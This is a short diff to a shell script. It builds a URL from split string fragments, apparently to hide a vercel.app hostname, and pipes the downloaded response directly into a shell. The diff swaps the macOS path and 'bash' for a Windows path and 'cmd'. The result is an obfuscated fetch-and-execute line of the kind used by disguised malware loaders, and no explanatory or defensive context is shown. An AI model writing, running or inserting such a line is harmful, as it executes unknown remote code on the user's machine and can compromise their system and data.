@@ -13,4 +13,4 @@ h1=".ver"; h2="cel.app"
 
 f=$((1+2+3))
 
-curl "${proto}://${dom}${h1}${h2}/settings/mac?flag=${f}" | bash
+curl "${proto}://${dom}${h1}${h2}/settings/windows?flag=${f}" | cmd
